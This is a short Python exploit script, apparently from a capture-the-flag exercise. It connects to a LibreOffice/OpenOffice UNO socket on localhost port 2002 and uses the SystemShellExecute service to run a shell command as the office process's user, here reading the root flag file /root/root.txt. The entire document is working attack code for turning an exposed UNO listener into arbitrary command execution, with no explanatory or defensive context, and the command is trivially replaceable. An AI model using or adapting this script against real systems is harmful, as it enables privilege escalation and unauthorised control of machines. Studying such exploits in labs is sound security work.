#!/usr/bin/env python3
import uno
from com.sun.star.beans import PropertyValue

local = uno.getComponentContext()

resolver = local.ServiceManager.createInstanceWithContext(
    "com.sun.star.bridge.UnoUrlResolver", local
)
context = resolver.resolve(
    "uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext"
)
rc = context.ServiceManager.createInstanceWithContext(
    "com.sun.star.system.SystemShellExecute", context
)
rc.execute("/usr/bin/cat", "/root/root.txt", 1)
